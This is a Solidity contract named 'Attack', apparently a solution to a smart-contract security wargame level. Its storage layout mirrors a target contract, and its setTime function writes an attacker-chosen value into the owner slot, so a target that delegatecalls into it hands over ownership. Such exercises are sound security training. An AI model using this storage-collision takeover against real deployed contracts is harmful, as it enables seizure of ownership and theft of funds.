// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    
    constructor(){
    }

    function setTime(uint256 _timeStamp) public {
        owner = address(uint160(_timeStamp));
    }
    
}